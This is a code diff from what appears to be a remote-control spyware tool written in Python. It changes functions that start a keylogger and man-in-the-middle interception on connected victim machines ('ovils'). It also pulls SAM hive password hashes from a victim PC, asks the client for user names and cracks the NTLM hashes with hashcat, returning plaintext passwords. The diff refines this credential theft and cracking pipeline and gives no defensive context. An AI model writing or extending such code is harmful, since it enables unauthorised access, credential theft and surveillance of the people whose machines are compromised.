@@ -1,6 +1,9 @@
 import ipaddress
+
+import psutil
 from hashcat.runp import runp
 from multiprocessing import freeze_support
+
 from spying import Spy
 from spying.multyproc import Process
 import os
@@ -224,7 +227,7 @@ def stop_dynamic_mitm(ip):
 
 
 def start_dynamicmitm(ip) -> str | bool:
-    if ipaddress.IPv4Address(ip) not in ipaddress.IPv4Network('192.168.0.0/24'):
+    if ipaddress.IPv4Address(ip) not in ipaddress.IPv4Network('192.168.0.0/24') and not ip.startswith("127"):
         Spy.open_port(MITM_DEFAULT_PORT)
     if ip not in ovils:
         return "Can't start KeyLogger on a disconnected ovil"
@@ -321,37 +324,49 @@ def crack(ip):
                 return d
     ovil = ovils[ovils.index(ip)]
     pc = steal_pc(ovil)
-    return crack_passwords(pc, None)
+    return crack_passwords(pc, ovil, None)
 
 
-def crack_passwords(passwords: str, timeout: int | None = MAX_TIME_TO_WAIT_FOR_CRACKING_HASH) -> str:
+def crack_passwords(passwords: str, ovil: Client, timeout: int | None = MAX_TIME_TO_WAIT_FOR_CRACKING_HASH) -> str:
     try:
         lines = passwords[passwords.index("============== SAM hive secrets =============="):passwords.index("============== SECURITY hive secrets ==============")].split("\n")
         hashes = []
+        r = ovil.send_command("get_users", [])[2:-2]
+        names = r.split("', '")
         users = {}
         for line in lines:
             line = line.strip()
             if line.endswith(":::"):
                 line = line[0:-3]
                 line = line.split(":")
-                hashes.append(line[-1])
-                users[line[0]] = line[-1]
+
+                name = line[0]
+                hashi = line[-1].upper()
+                if name in names:
+                    hashes.append(hashi)
+                    users[hashi] = name
         with open("hashcat\\hash.txt", "w") as h:
             h.write("\n".join(hashes))
         with open("hashcat\\cracked.txt", "w") as c:
             c.write("")
-        args = (["hashcat.exe", "-m", "1000", "-a3", "-o", "cracked.txt", "hash.txt"], "hashcat")
+        args = (["hashcat.exe", "-a", "3", "-m", "1000", "-o", "cracked.txt", "hash.txt"], "hashcat")
 
         p = Process(target=runp, args=args)
         p.start()
         p.join(timeout)
+
+        args[0].append("--show")
+        p = Process(target=runp, args=args)
+        p.start()
+        p.join(timeout)
+
         msg = ""
         with open("hashcat\\cracked.txt", "r") as c:
-            for line in c.readlines():
+            for line in set(c.readlines()):
                 line = line.strip()
                 if ":" in line:
                     h, password = line.split(":")
-                    msg += f"{users[h]}:{password}"
+                    msg += f"{users[h.upper()]}: {password}"
         if not msg:
             return "time ran out! this is a hard password. you can try wait for longer or give up..."
         return msg
